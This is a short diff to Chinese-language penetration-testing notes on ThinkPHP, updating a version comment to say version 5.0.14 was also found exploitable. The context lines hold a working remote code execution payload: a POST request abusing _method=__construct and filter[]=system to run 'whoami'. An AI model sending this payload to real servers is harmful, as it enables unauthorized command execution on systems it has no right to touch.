@@ -123,7 +123,7 @@ return $this->display(); //display方法也可以触发漏洞
 ```php
 # 代码执行
 # 不同版本 payload 需稍作调整：
-# ThinkPHP <= 5.0.13：
+# ThinkPHP <= 5.0.13：（更新，某次实战发现5.0.14也可以）
 POST /?s=index/index
 s=whoami&_method=__construct&method=&filter[]=system
 
